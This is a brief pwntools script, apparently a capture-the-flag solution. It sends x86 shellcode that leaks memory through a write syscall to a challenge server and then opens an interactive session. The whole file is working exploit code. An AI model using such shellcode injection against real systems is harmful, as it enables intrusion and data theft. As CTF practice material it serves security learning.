#!/usr/bin/env /bin/python2
from pwn import *

payload = "\xd9\xee\x9b\xd9t$\xf4Y\x83\xe92\xbad\x00\x00\x00\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"

r = remote('challenges.notanexploit.club', 3651)

r.sendline(payload)
r.interactive()
